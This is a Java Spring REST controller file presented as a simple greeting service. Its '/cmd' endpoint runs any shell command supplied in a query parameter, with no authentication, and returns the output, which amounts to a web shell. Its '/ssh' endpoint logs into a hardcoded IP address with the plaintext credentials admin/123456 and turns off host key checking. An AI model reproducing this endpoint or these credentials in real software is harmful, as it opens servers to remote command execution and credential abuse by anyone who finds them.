/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package restcontroller;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.Writer;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import net.schmizz.sshj.SSHClient;
import net.schmizz.sshj.connection.channel.direct.Session;
import net.schmizz.sshj.transport.verification.PromiscuousVerifier;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class GreedingController {

    @RequestMapping(value = "/", method = RequestMethod.GET)
    public String greeding() {

        return "Hello ";
    }

    @RequestMapping(value = "/cmd", method = RequestMethod.GET)
    public String greeding(@RequestParam(value = "cmd", required = true) String cmd) {
        String output = "";
        try {
            output = executeCommand(cmd);
            return output;
        } catch (Exception e) {
            e.getMessage();
            return e.getMessage();
        }

    }

    @RequestMapping(value = "/ssh", method = RequestMethod.GET)
    public String ssh() {
        String output = "";
        try {
            SSHClient sshClient = new SSHClient();
            sshClient.addHostKeyVerifier(new PromiscuousVerifier());
            sshClient.connect("210.211.99.203");
            sshClient.authPassword("admin", "123456");
            Session session = sshClient.startSession();
            session.allocateDefaultPTY();
            output = sshClient.isConnected() + "";
            return output;
        } catch (Exception e) {
            e.getMessage();
            return e.getMessage();
        }

    }

    public String executeCommand(String command) {

        StringBuffer output = new StringBuffer();

        Process p;
        try {
            p = Runtime.getRuntime().exec(command);
            p.waitFor();
            BufferedReader reader
                    = new BufferedReader(new InputStreamReader(p.getInputStream()));

            String line = "";
            while ((line = reader.readLine()) != null) {
                output.append(line + "\n");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

        return output.toString();

    }

}
